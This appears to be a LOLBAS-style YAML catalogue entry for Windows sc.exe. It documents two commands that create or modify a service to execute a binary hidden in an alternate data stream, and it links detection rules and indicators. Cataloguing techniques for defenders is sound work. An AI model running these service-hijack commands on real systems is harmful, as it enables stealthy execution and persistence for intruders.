---
Name: Sc.exe
Description: Used by Windows to manage services
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
    Description: Creates a new service and executes the file stored in the ADS.
    Usecase: Execute binary file hidden inside an alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: sc config <existing> binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start <existing>
    Description: Modifies an existing service and executes the file stored in the ADS.
    Usecase: Execute binary file hidden inside an alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\sc.exe
  - Path: C:\Windows\SysWOW64\sc.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_new_service_creation.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_using_sc_to_change_sevice_image_path_by_non_admin.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_susp_service_path_modification.yml
  - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/sc_exe_manipulating_windows_services.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/lateral_movement_cmd_service.toml
  - IOC: Unexpected service creation
  - IOC: Unexpected service modification
Resources:
  - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
